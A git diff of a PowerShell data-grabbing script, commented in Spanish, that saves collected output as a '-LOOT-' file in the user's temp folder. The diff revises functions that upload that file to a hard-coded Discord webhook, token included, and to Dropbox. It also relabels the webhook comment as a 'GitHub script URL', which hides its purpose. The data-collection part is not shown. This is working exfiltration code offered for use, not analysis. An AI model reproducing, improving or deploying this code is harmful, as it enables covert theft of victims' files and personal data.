@@ -1,8 +1,6 @@
-# Define la URL del webhook de Discord
+# Define la URL del script en GitHub
 $dc = 'https://discord.com/api/webhooks/1264728039682740356/RjUIrKfIKnpBH3npIAWT-M7YZ0KfwCzVmkgGp8yF2Bv3hagAgVVdSucimNeswCoiStR3'
-
-# Define el token de Dropbox
-$db = '' # Añade aquí tu token de Dropbox
+$db = '' # Agrega tu token de Dropbox aquí
 
 $FileName = "$env:TEMP\$env:USERNAME-LOOT-$(Get-Date -Format yyyy-MM-dd_hh-mm).txt"
 
@@ -69,6 +67,7 @@ $output | Out-File -FilePath $FileName
 #------------------------------------------------------------------------------------------------------------------------------------
 
 function Upload-Discord {
+    [CmdletBinding()]
     param (
         [string]$file,
         [string]$text
@@ -88,17 +87,12 @@ function Upload-Discord {
     if (-not [string]::IsNullOrEmpty($file)) {
         $fileContent = [System.IO.File]::ReadAllBytes($file)
         $boundary = [System.Guid]::NewGuid().ToString()
-        $body = "--$boundary`r`n"
-        $body += "Content-Disposition: form-data; name=`"file1`"; filename=`"$($file | [System.IO.Path]::GetFileName())`"`r`n"
-        $body += "Content-Type: application/octet-stream`r`n`r`n"
-        $body += [System.Text.Encoding]::ASCII.GetString($fileContent)
-        $body += "`r`n--$boundary--`r`n"
-        
+        $fileContentString = [System.Text.Encoding]::UTF8.GetString($fileContent)
+        $content = "--$boundary`r`nContent-Disposition: form-data; name=`"file1`"; filename=`"$([System.IO.Path]::GetFileName($file))`"`r`nContent-Type: application/octet-stream`r`n`r`n$fileContentString`r`n--$boundary--`r`n"
         $headers = @{
             "Content-Type" = "multipart/form-data; boundary=$boundary"
         }
-
-        Invoke-RestMethod -Uri $hookurl -Method Post -Body $body -Headers $headers
+        Invoke-RestMethod -Uri $hookurl -Method Post -Body $content -Headers $headers
     }
 }
 
@@ -107,6 +101,7 @@ if (-not [string]::IsNullOrEmpty($dc)) { Upload-Discord -file $FileName }
 #------------------------------------------------------------------------------------------------------------------------------------
 
 function DropBox-Upload {
+    [CmdletBinding()]
     param (
         [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
         [Alias("f")]
